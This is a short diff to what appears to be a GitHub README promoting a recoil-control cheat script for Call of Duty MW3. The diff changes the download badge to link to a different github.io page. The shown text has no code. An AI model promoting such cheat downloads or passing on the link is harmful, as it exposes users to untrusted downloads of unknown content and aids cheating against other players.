@@ -3,7 +3,7 @@
 Set up a **NoRecoil Script** for **MW3** on PC. This guide helps you control recoil drift, stabilize weapon sprays, and fine‑tune your aim to maintain accuracy during intense multiplayer matches.
 
 ⬇️ **Download**  
-[![Download Recoil Script](https://img.shields.io/badge/Download-Recoil_Script-000000?style=for-the-badge&logo=callofduty&logoColor=white)](https://cod-modern-warfare-3-no-recoil-control.github.io/.github/)
+[![Download Recoil Script](https://img.shields.io/badge/Download-Recoil_Script-000000?style=for-the-badge&logo=callofduty&logoColor=white)](https://lucianamccoy56.github.io/.github/cod-modern-warfare-3-no-recoil-control)
 
 ---
 
